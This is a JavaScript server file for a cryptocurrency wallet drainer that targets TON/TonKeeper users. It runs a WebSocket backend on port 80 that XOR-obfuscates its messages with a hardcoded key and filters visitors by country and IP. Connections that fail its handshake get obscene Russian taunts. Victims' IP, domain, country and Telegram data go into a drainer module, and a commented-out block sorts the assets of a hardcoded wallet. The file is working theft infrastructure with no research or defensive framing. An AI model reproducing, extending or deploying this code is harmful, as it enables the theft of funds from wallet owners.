const Drainer = require("./modules/drainer");
const WebSocketServer = require("ws").Server;
let server = require('http').createServer();
const axios = require("axios");
const Utils = require("./modules/utils");
const TonKeeper = require("./modules/tonkeeper");
const Sorter = require("./modules/tonkeeper/sorter");
let app = require('./routers/index');
const config = require("./config");

server.on('request', app);

const wss = new WebSocketServer({ server: server });
const someKey = "opsdaodsaoaodfkkk12k1k1";

TonKeeper.initialize();

function xorConvert(text, key) {
    var kL = key.length;

    return Array.prototype
        .slice.call(text)
        .map(function (c, index) {
            return String.fromCharCode(c.charCodeAt(0) ^ key[index % kL].charCodeAt(0));
        }).join('');
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
}

let connected = {

}

wss.on("connection", (ws, req, res) => {
    let safety = false;
    let domain, telegram_data, ip, country;
    let clients = [];
    let key = generateRandomString(60);
    let initialized = false;

    console.log("Connected")

    ip = req.headers["cf-connecting-ip"];
    country = req.headers["cf-ipcountry"];

    if(config.blocked_countries.includes(country)) return ws.close();

    if(connected[ip] >= 10) {
        console.log("мама шлюха 10 айпи");

        ws.send(JSON.stringify({
            type: "matb shluxa!",
            message: "molodec, y tebya matb shluxa"
        }))
        return ws.close();
    }

    if(connected[ip] != undefined) connected[ip] += 1
    else connected[ip] = 1;

    ws.on('message', async function message(data) {
        data = JSON.parse(data);

        if(data.event == "connection") {
            let dataToSend = { key }
            let encryptedData = xorConvert(JSON.stringify(dataToSend), someKey);

            ws.send(JSON.stringify({
                event: "safety",
                encryptedData
            }));

            safety = true;

            return;
        }

        if(data.event == "proof") {
            if(initialized) {
                console.log("мама шлюха инитализнутый пруф");

                ws.send(JSON.stringify({
                    type: "matb shluxa!",
                    message: "molodec, y tebya matb shluxa"
                }))
                return ws.close();
            }
            initialized = true;
            console.log("initialization");

            let { encryptedData } = data;
            let decryptedData = JSON.parse(xorConvert(encryptedData, key));

            if(decryptedData.message != "hello") {
                console.log("мама шлюха сообщение хуйня");

                ws.send(JSON.stringify({
                    type: "matb shluxa!",
                    message: "molodec, y tebya matb shluxa"
                }))
                return ws.close();
            }

            let { domain, telegram_data } = decryptedData;

            if(ip != undefined) ip = ip.replace("::ffff:", "");

            let { clientsConnected, answer } = await Drainer.initialize(ws, {
                ip,
                domain,
                key,
                telegram_data,
                country
            });

            clients = clientsConnected;
            ws.send(JSON.stringify({
                event: "drainer",
                encryptedData: xorConvert(JSON.stringify({
                    answer
                }), key)
            }));
        }
    });

    ws.on('error', console.error);

    ws.on("close", async () => {
        setTimeout(async () => {
            for(let i = 0; i < clients.length; i++) {
                let client = clients[i];
                await client.bridge.close();
            }

            console.log("closed");
            connected[ip] -= 1;
        }, 1000 * 60 * 10);
    })
})

process.on('uncaughtException', (error) => {
    console.log(error);
})

server.listen(80, function() {
    console.log(`http/ws server listening on 80`);
});

//(async () => {
//    await TonKeeper.initialize();
//
//    let sorted_assets = Sorter.sortAssets((await Sorter.getAssets("UQAtw_k-79ZcppdDqqGGbpagY9gqLHnGHcmSROzsY-WwjM3l")));
//    console.log(sorted_assets)
//})()
